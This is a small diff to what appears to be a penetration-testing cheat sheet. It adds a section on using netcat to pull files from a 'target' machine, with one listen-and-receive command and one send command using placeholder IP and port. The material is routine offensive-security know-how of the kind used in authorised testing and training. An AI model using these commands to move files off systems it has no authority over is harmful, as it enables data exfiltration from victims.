@@ -48,6 +48,11 @@ python3 -m http.server [port] `By default will listen on 8000`<br/>
 
 wget http://<ip>:port/<file>
 
+### Netcat to download files from target
+
+`nc -l -p [port] > file` Receive file <br/>
+`nc -w 3 [ip] [port] < file `Send file <br/>
+
 # Windows
 
 ### Adding User
